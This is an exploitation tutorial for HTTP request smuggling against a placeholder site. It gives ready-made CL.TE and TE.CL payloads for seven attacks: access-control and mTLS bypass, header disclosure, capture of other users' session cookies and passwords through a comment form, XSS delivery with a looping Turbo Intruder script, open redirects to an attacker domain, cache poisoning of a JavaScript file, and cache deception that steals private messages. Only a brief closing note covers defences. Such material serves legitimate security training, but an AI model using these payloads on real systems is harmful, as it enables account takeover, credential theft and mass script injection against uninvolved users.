# Exploiting HTTP Request Smuggling Vulnerabilities

Every HTTP request smuggling exploit shares the same primitive: a smuggled prefix is silently prepended to the next victim's request before that request reaches the back-end. The difference between the attack classes in this section is purely about *what* that prefix causes the back-end to do — whether it bypasses an access control decision, forces the back-end to absorb the victim's request into attacker-readable storage, serves an XSS payload, poisons a cache, or stores sensitive content under a static URL the attacker can later retrieve. Chaining these primitives together — for example, turning a reflected XSS into a mass-delivery stored attack via cache poisoning — is where the real severity of this class becomes clear. 

**Fundamental principle: In every exploit below, the front-end server enforces security controls or determines what response gets cached based on what it believes the request is. The back-end server, which the front-end implicitly trusts, receives a different, smuggled version of reality. The attacker exploits this gap by making the front-end enforce controls on an innocent-looking request while the back-end executes the smuggled malicious one.**

***

## Exploit 1: Bypassing Front-End Security Controls

The front-end enforces access control and only forwards allowed requests. The back-end trusts that whatever the front-end forwarded must have been permitted — it performs no independent access check. 

```http
# ── SCENARIO: /admin is blocked at front-end; back-end serves it to all ───────
# Front-end: blocks /admin → 403 Forbidden for any request to /admin
# Back-end: serves /admin without additional access checking

# ── CL.TE BYPASS ──────────────────────────────────────────────────────────────

POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62              ← front-end sees: 62 bytes of body → forwards all
Transfer-Encoding: chunked      ← back-end reads chunks

0                               ← back-end: chunk terminator → end of request 1
                                ← smuggled prefix begins:
GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x                          ← open header; victim's request absorbed into value

# ── WHAT THE FRONT-END SEES ───────────────────────────────────────────────────
# Request 1: POST /home  ← allowed, forwarded ✓
# (The GET /admin bytes are body content from the front-end's perspective)
# → Front-end never makes an access control decision on /admin ✓

# ── WHAT THE BACK-END SEES ────────────────────────────────────────────────────
# Request 1: POST /home  ← processed normally
# Request 2: GET /admin  ← next request starts from the smuggled prefix
#   Foo: x[VICTIM REQUEST BYTES]  ← victim's headers absorbed into "Foo" value
# Back-end: "this came from front-end → must have been authorised" → 200 OK ✓

# Send a follow-up request (normal GET to trigger the smuggled prefix):
GET /home HTTP/1.1
Host: vulnerable-website.com
# → Back-end processes: GET /admin HTTP/1.1\r\nHost: vulnerable-website.com\r\n
#                       Foo: xGET /home HTTP/1.1\r\n...
# → Response: 200 OK with admin panel HTML ✓


# ── TE.CL BYPASS ──────────────────────────────────────────────────────────────
# (For when back-end uses Content-Length, front-end uses Transfer-Encoding)

POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4               ← back-end (CL) reads 4 bytes: "71\r\n" → STOPS
Transfer-Encoding: chunked      ← front-end (TE) processes chunks → forwards all

71                              ← chunk size: 0x71 = 113 decimal bytes
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

0
                                ← (followed by \r\n\r\n)

# ── ESCALATION: Delete an admin user from the panel ───────────────────────────
# First, confirm you can reach /admin and identify admin actions in the response.
# Then chain a follow-up smuggled request to act on what you find:

POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Length: 86
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost                  ← back-end may check Host=localhost for admin access
Content-Length: 0
Foo: x


# ── BYPASSING CLIENT CERTIFICATE (mTLS) AUTH VIA SMUGGLING ───────────────────
# Front-end performs mutual TLS handshake → validates client cert
# → Forwards client's common name (CN) to back-end via trusted internal header:
#   X-SSL-CLIENT-CN: carlos
#
# Back-end trusts this header for access control → no independent cert validation
# BUT: front-end overwrites X-SSL-CLIENT-CN if it's already present in requests
# Smuggled requests bypass front-end entirely → header not overwritten ✓

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator  ← injected as if front-end had authenticated "administrator"
Foo: x                          ← absorbs victim's request as header value

# Back-end receives X-SSL-CLIENT-CN: administrator → grants admin access ✓
# Front-end never processed the smuggled request → never overwrote the injected header ✓
```

***

## Exploit 2: Revealing Front-End Request Rewriting

The front-end adds internal headers (TLS metadata, user IDs, IP addresses) that the back-end trusts. To include these in your own smuggled requests, you first need to know exactly which headers the front-end injects and what values it uses. 

```http
# ── GOAL: Discover what headers the front-end adds before forwarding ──────────
# Without knowing these headers, smuggled requests may fail (back-end rejects them)
# or miss security-relevant context (e.g., user ID header for access control)

# ── STEP 1: Find a reflection gadget ─────────────────────────────────────────
# Need: an endpoint that reflects a request parameter value into the response body
# Common candidates: /login (reflects email), /search (reflects q), /register

# Test:
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net

# Response includes:
# <input id="email" value="wiener@normal-user.net" type="text">
# → email parameter is reflected → suitable gadget ✓


# ── STEP 2: Position reflected parameter LAST in the body ─────────────────────
# The smuggled request's body is open-ended (large CL) and the "email=" value
# will absorb the NEXT request's bytes.
# Placing the reflected param last ensures absorbed bytes appear in the reflection.

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130             ← large enough to encompass smuggled request + some of next
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100             ← back-end waits for 100 bytes; absorbs next request

email=                          ← open value; will absorb the incoming request bytes


# ── STEP 3: Send the follow-up request (the one you want to reveal) ───────────

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net

# ── WHAT THE BACK-END PROCESSES ───────────────────────────────────────────────
# Smuggled request body absorbs the incoming rewritten request:
#
# POST /login HTTP/1.1
# Host: vulnerable-website.com
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 100
#
# email=POST /login HTTP/1.1
# Host: vulnerable-website.com
# X-Forwarded-For: 1.3.3.7             ← added by front-end!
# X-Forwarded-Proto: https             ← added by front-end!
# X-TLS-Bits: 128                      ← added by front-end!
# X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256  ← added by front-end!
# X-TLS-Version: TLSv1.2              ← added by front-end!
# X-Internal-User-ID: 1337            ← added by front-end! (user session → ID)
# x-nr-external-service: external     ← added by front-end!

# Response to the follow-up request:
# <input id="email" value="POST /login HTTP/1.1
# Host: vulnerable-website.com
# X-Forwarded-For: 1.3.3.7
# X-Forwarded-Proto: https
# X-TLS-Bits: 128
# X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
# X-TLS-Version: TLSv1.2
# X-Internal-User-ID: 1337
# x-nr-external-service: external
# ..." />
# → ALL front-end-injected headers revealed ✓


# ── TUNING Content-Length IN SMUGGLED REQUEST ──────────────────────────────────
# The CL value controls how many bytes of the next request are absorbed.
# Strategy: start just above the actual smuggled body size, increase gradually.
#
# Too small (e.g. CL: 30):
# email=POST /login HTTP/1.1\r\nHo     ← cut off mid-header → incomplete output
#
# Too large (e.g. CL: 5000):
# Back-end waits for 5000 bytes → never arrives → connection timeout
#
# Incremental approach:
# Round 1: CL: 100 → see first few headers
# Round 2: CL: 200 → see more headers
# Round 3: CL: 300 → see full rewritten request including all internal headers


# ── APPLYING DISCOVERED HEADERS TO YOUR SMUGGLED REQUESTS ─────────────────────
# Once you know the front-end adds X-Internal-User-ID, add it to your smuggled
# admin request to impersonate an admin:

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
X-Internal-User-ID: 1          ← admin user ID discovered via front-end rewriting
X-Forwarded-For: 127.0.0.1
Content-Length: 0
Foo: x
```

***

## Exploit 3: Capturing Other Users' Requests

A storage gadget (comment system, search history, profile bio) is weaponised to capture the raw bytes of victim requests — including session cookies, CSRF tokens, and credentials — by making the back-end treat the victim's incoming request bytes as the value of the last parameter in the smuggled body. 

```http
# ── SCENARIO OVERVIEW ─────────────────────────────────────────────────────────
# Application has: blog comment submission that stores and displays user input.
# Attacker goal: capture victim's session cookie from their HTTP request.

# ── STEP 1: Confirm the storage gadget works ──────────────────────────────────
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=ATTACKER_SESSION

csrf=VALIDTOKEN&postId=2&comment=HelloTest&name=Attacker&email=a%40a.com&website=https%3A%2F%2Fa.com

# Verify comment "HelloTest" appears on post 2 → gadget confirmed ✓


# ── STEP 2: Build the capture smuggle request ─────────────────────────────────
# Key requirements:
# 1. "comment=" must be the LAST parameter (absorbs victim request as its value)
# 2. CL in smuggled request must be LARGER than actual body (leaves it "open")
# 3. Use attacker's own session/CSRF so the comment actually posts
# 4. postId must reference a post the attacker can later read

GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330             ← front-end (CL) forwards 330 bytes

0                               ← back-end (TE) terminates request 1 here

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400             ← LARGER than actual body → back-end waits for more bytes
Cookie: session=ATTACKER_SESSION

csrf=VALID_CSRF_TOKEN&postId=2&name=Attacker&email=attacker%40evil.net&website=https%3A%2F%2Fevil.net&comment=

# ── ACTUAL BODY BYTE COUNT ────────────────────────────────────────────────────
# Count bytes from "POST /post/comment HTTP/1.1" onwards in the chunk.
# CL: 400 is intentionally LARGER than actual body (≈ 144 bytes here).
# Gap = 400 - 144 = 256 bytes → back-end waits for 256 more bytes.
# When victim's request arrives → its first 256 bytes fill the gap.

# ── WHAT THE BACK-END PROCESSES ───────────────────────────────────────────────
# Victim sends:
# GET /home HTTP/1.1
# Host: vulnerable-website.com
# Cookie: session=VICTIM_SESSION_TOKEN_HERE   ← HIGH VALUE
# Content-Length: 0
# Accept: text/html...
# ...
#
# Back-end appends victim's bytes to fill the 256-byte gap:
# comment=GET /home HTTP/1.1\r\n
# Host: vulnerable-website.com\r\n
# Cookie: session=VICTIM_SESSION_TOKEN_HERE\r\n
# Content-Length: 0\r\n
# Accept: text/html,application/xhtml+xml,...\r\n
# ...
#
# POST to /post/comment completes with comment value = victim's request headers
# Comment stored in database and displayed on post 2 ✓

# ── STEP 3: Read the captured comment ────────────────────────────────────────
GET /post?postId=2 HTTP/1.1
Host: vulnerable-website.com
Cookie: session=ATTACKER_SESSION

# Response:
# <p class="comment">GET /home HTTP/1.1
# Host: vulnerable-website.com
# Cookie: session=VICTIM_SESSION_TOKEN_HERE   ← session token ✓
# Content-Length: 0
# Accept: text/html...</p>

# ── STEP 4: Use the captured session ─────────────────────────────────────────
# Replace attacker's session with victim's in browser Cookie Editor extension:
# Session: VICTIM_SESSION_TOKEN_HERE
# Reload /account or /admin → logged in as victim ✓


# ── TUNING CONTENT-LENGTH ─────────────────────────────────────────────────────

# Problem: CL too small → victim's Cookie header cut before full token
# comment=GET /home HTTP/1.1\r\nHost: vulnerable-website.com\r\nCookie: session=abc
#                                                                              ↑ CUT
# Fix: increase CL in smuggled request (start at 400, increase by 100 each attempt)

# Problem: CL too large → back-end times out waiting for extra bytes
# Fix: reduce CL until response is received without timeout

# Problem: & character in victim's query string truncates absorbed content
# Because: comment= is a URL-encoded form param → & is a param delimiter
# "comment=GET /home?q=test&other=value" → back-end sees comment ends at "&"
# Fix: smuggle to a JSON endpoint (if available) which doesn't use & delimiters
#      OR use a multi-line comment if the application stores raw line breaks


# ── CAPTURING CREDENTIALS (login form target) ─────────────────────────────────
# If victim is sending:
# POST /login HTTP/1.1
# Cookie: session=...
# username=admin&password=SECRET123
#
# Back-end stores:
# comment=POST /login HTTP/1.1\r\nHost: ...\r\nCookie: ...\r\n\r\nusername=admin&password=SECRET123
# Attacker reads comment → plaintext password captured ✓ → full credential theft
```

***

## Exploit 4: Delivering Reflected XSS to Other Users

Reflected XSS in an HTTP header (e.g., `User-Agent`) is normally unexploitable because an attacker cannot force a victim's browser to send a crafted `User-Agent`. Request smuggling removes that constraint entirely. 

```http
# ── SCENARIO: User-Agent reflected unencoded in /home page ───────────────────
# Normal page includes:
# <p>Your browser: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...</p>
# Reflected unencoded → XSS candidate but normally unexploitable via User-Agent

# ── WHY NORMAL REFLECTED XSS IS BLOCKED ──────────────────────────────────────
# Attacker would need victim to send:
# User-Agent: <script>alert(document.cookie)</script>
# → No browser ever sends this User-Agent
# → Attacker cannot control victim's User-Agent → "unexploitable"

# ── CL.TE SMUGGLING REMOVES THE CONSTRAINT ────────────────────────────────────

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(document.cookie)</script>
Foo: X

# ── WHAT HAPPENS ──────────────────────────────────────────────────────────────
# Back-end buffer after processing attack:
# "GET / HTTP/1.1\r\nUser-Agent: <script>alert(document.cookie)</script>\r\nFoo: X"
#
# Victim sends their normal request:
# GET /home HTTP/1.1
# Host: vulnerable-website.com
# User-Agent: Mozilla/5.0...
#
# Back-end receives:
# GET / HTTP/1.1
# User-Agent: <script>alert(document.cookie)</script>
# Foo: XGET /home HTTP/1.1          ← victim's request absorbed into "Foo" value
# Host: vulnerable-website.com
# User-Agent: Mozilla/5.0...
#
# Back-end processes: GET / HTTP/1.1 with attacker's User-Agent
# Response: <p>Your browser: <script>alert(document.cookie)</script></p>
# Victim receives this response → XSS fires in their browser ✓


# ── BODY BYTE COUNT ───────────────────────────────────────────────────────────
# "0\r\n\r\n" = 5 bytes
# "GET / HTTP/1.1\r\n" = 16 bytes
# "User-Agent: <script>alert(document.cookie)</script>\r\n" = 53 bytes
# "Foo: X" = 6 bytes
# Total = 80 bytes → CL: 80 (adjust to match exactly)

# ── ESCALATING TO MASS DELIVERY WITH TURBO INTRUDER ──────────────────────────
# Send the attack request in a loop → every victim who visits between iterations
# receives the XSS response. No victim interaction with a crafted URL required.
#
# Turbo Intruder script:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)
    attack = '''POST / HTTP/1.1
Host: %s
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(document.cookie)</script>
Foo: X''' % target.host
    engine.queue(attack)

def handleResponse(req, interesting):
    table.add(req)

# Fire this in a loop → every user visiting / gets the XSS ✓
```

***

## Exploit 5: Turning On-Site Redirects into Open Redirects

Apache and IIS redirect `/path` → `/path/` (trailing slash redirect). The `Location` header is built using the `Host` header. Smuggling allows the attacker to set a malicious `Host` in the smuggled request while the victim's request provides only a clean URL path. 

```http
# ── BASELINE: On-site redirect behaviour ─────────────────────────────────────
GET /home HTTP/1.1
Host: vulnerable-website.com

# Response:
# HTTP/1.1 301 Moved Permanently
# Location: https://vulnerable-website.com/home/
# → Intended behaviour: redirect to the same host with trailing slash

# ── ATTACK: Replace Host in smuggled request with attacker domain ─────────────

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com          ← attacker's domain in the smuggled request
Foo: X                              ← absorbs victim's request start as header value

# Back-end buffer: "GET /home HTTP/1.1\r\nHost: attacker-website.com\r\nFoo: X"
#
# Victim's request arrives:
# GET /scripts/include.js HTTP/1.1
# Host: vulnerable-website.com
# ...
#
# Back-end processes:
# GET /home HTTP/1.1
# Host: attacker-website.com
# Foo: XGET /scripts/include.js HTTP/1.1...
#
# Back-end generates redirect:
# HTTP/1.1 301 Moved Permanently
# Location: https://attacker-website.com/home/    ← points to attacker's domain!
#
# Victim was requesting /scripts/include.js → receives 301 to attacker's site ✓
# Browser follows redirect → fetches content from attacker's server ✓
# If include.js was a script → attacker serves malicious JavaScript → full XSS ✓


# ── VARIANT: Protocol-relative URL in path for root-relative redirect ─────────
# Some servers generate root-relative redirects (no host):
GET /example HTTP/1.1
Host: normal-website.com
# Response: Location: /example/   (no domain in Location)

# Use protocol-relative path to force domain in Location:
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com
# Response: Location: //attacker-website.com/example/
# → Browser interprets //attacker-website.com as an absolute URL with inferred scheme
# → Redirects to attacker-website.com ✓


# ── FULL PAYLOAD: Deliver XSS via smuggled open redirect + cache poisoning ────
# Attacker's server at attacker-website.com/home serves:
# Content-Type: text/javascript
# alert(document.cookie)

# Attack request chains redirect with a cached script resource:
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com

# Front-end caches the 301 redirect against:
# GET /static/include.js HTTP/1.1  ← the "second request" visible to front-end
# Cache entry: /static/include.js → 301 to attacker-website.com/home
# From now on: all users loading include.js receive malicious JS ✓
```

***

## Exploit 6: Web Cache Poisoning via Request Smuggling

Combines request smuggling with web cache poisoning: the malicious response generated by the smuggled request is stored by the front-end cache against a legitimate URL, making the attack persistent and hitting all future users of that URL. 

```http
# ── SCENARIO: Front-end caches /static/include.js ────────────────────────────
# Front-end cache: caches responses to GET requests for /static/ resources
# Back-end: generates 301 redirect when given a non-existent /home path with custom Host

# ── ATTACK: Poison the cached JS file with an off-site redirect ───────────────

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com          ← smuggled Host → back-end returns 301 here
Foo: XGET /static/include.js HTTP/1.1   ← this line = victim's request start
Host: vulnerable-website.com

# ── WHAT HAPPENS STEP BY STEP ─────────────────────────────────────────────────
#
# 1. Attack request arrives at front-end
#    Front-end (CL): forwards full body (59 bytes)
#    Front-end does not cache (it's a POST) → passes to back-end
#
# 2. Back-end processes:
#    Request 1: POST / → normal response
#    Smuggled prefix left in buffer: "GET /home HTTP/1.1\r\nHost: attacker-website.com\r\nFoo: X"
#
# 3. Victim's request arrives: GET /static/include.js
#    Back-end buffer: GET /home HTTP/1.1\r\nHost: attacker-website.com\r\nFoo: XGET /static/include.js...
#    Back-end processes: GET /home with Host: attacker-website.com → 301 redirect
#    HTTP/1.1 301 Moved Permanently
#    Location: https://attacker-website.com/home/
#
# 4. Front-end receives this 301 response
#    Front-end believes this is the response to: GET /static/include.js
#    (because that's the URL in the "second request" it forwarded)
#    Front-end CACHES: GET /static/include.js → 301 to attacker-website.com/home
#
# 5. All future requests for /static/include.js receive the cached 301 ✓
#    Every user loading the page → their browser follows redirect → executes attacker's JS ✓

# ── ATTACKER'S EXPLOIT SERVER SETUP ──────────────────────────────────────────
# Host at attacker-website.com/home:
HTTP/1.1 200 OK
Content-Type: text/javascript
Access-Control-Allow-Origin: *

alert(document.cookie)

# ── TIMING CONSIDERATIONS ─────────────────────────────────────────────────────
# Cache TTL: if cache entries expire every 30 seconds, re-poison every ~25 seconds
# Use Turbo Intruder to automate continuous re-poisoning:
#   Send attack request every 20 seconds → cache always poisoned
# Between re-poison cycles, ALL users loading include.js get malicious JS ✓
```

***

## Exploit 7: Web Cache Deception via Request Smuggling

The inverse of poisoning. Instead of serving *malicious* content to all users, the attacker causes the front-end to *store* a victim's sensitive response under a static URL that the attacker can later retrieve. 

```http
# ── DISTINCTION: Poisoning vs. Deception ──────────────────────────────────────
# Cache Poisoning:  attacker stores ATTACKER's malicious content in cache
#                   → served to ALL users of that URL → mass attack
# Cache Deception:  attacker causes VICTIM's sensitive response to be stored in cache
#                   → attacker retrieves it → single-victim data theft

# ── ATTACK REQUEST ────────────────────────────────────────────────────────────

POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1  ← smuggled: fetches victim's private messages
Foo: X                          ← open header; absorbs victim's next request

# ── WHAT HAPPENS ──────────────────────────────────────────────────────────────
#
# Back-end buffer: "GET /private/messages HTTP/1.1\r\nFoo: X"
#
# Victim sends:
# GET /static/some-image.png HTTP/1.1
# Host: vulnerable-website.com
# Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z    ← victim's session
#
# Back-end processes:
# GET /private/messages HTTP/1.1
# Foo: XGET /static/some-image.png HTTP/1.1            ← victim's request absorbed
# Host: vulnerable-website.com
# Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z  ← victim's session used ✓
#
# Back-end: processes /private/messages in the context of VICTIM's session
# Response: victim's private messages HTML ✓
#
# Front-end: believes this response belongs to: GET /static/some-image.png
# (that was the "second request" it forwarded)
# Front-end CACHES: /static/some-image.png → victim's private messages ✓
#
# 4. Attacker requests: GET /static/some-image.png
# Response: <h1>Your private messages</h1>... (victim's sensitive data) ✓

# ── THE CHALLENGE: FINDING THE CACHED URL ─────────────────────────────────────
# The attacker doesn't know which static URL the victim will request.
# Strategy: fire the attack request repeatedly while enumerating static URLs.

# URLs to probe (script the following, checking for anomalous response content):
/static/include.js
/static/bootstrap.min.js
/resources/img/logo.png
/favicon.ico
/static/main.css
/assets/images/hero.jpg
# → If any returns HTML instead of expected content type → sensitive data captured ✓

# Automate with Burp Intruder:
GET /static/§FILENAME§ HTTP/1.1
Host: vulnerable-website.com
# Payload: wordlist of common static file names
# Grep match: "private messages" / "Your account" / "Welcome, [username]"
# → Matching response reveals the cached sensitive content ✓

# ── DEFENSIVE NOTE: Why cache deception is sometimes hard to prevent ──────────
# Cache deception exploits the fundamental assumption that:
# "responses to requests for static files are safe to cache for all users"
# This is correct for true static files, but the desync causes the WRONG response
# to be mapped to the static file URL — a response generated in the victim's context.
# Defences: use Vary: Cookie header on sensitive pages, never cache authenticated pages,
# ensure Cache-Control: private / no-store on all user-specific responses.
```
